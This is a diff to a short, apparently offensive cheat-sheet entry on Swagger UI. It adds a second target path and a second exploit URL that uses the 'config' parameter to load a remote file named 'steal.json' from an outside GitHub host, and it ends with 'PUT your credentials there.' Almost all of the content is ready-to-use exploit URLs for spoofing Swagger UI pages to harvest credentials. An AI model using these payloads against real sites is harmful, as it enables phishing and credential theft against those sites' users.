@@ -3,10 +3,12 @@
 Site:
 ```bash
 site.com/swagger-ui.html
+site.com/swagger
 ```
 Exploit:
 ```bash
 site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
+site.com/swagger?config=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
 ```
 
 PUT your credentials there.
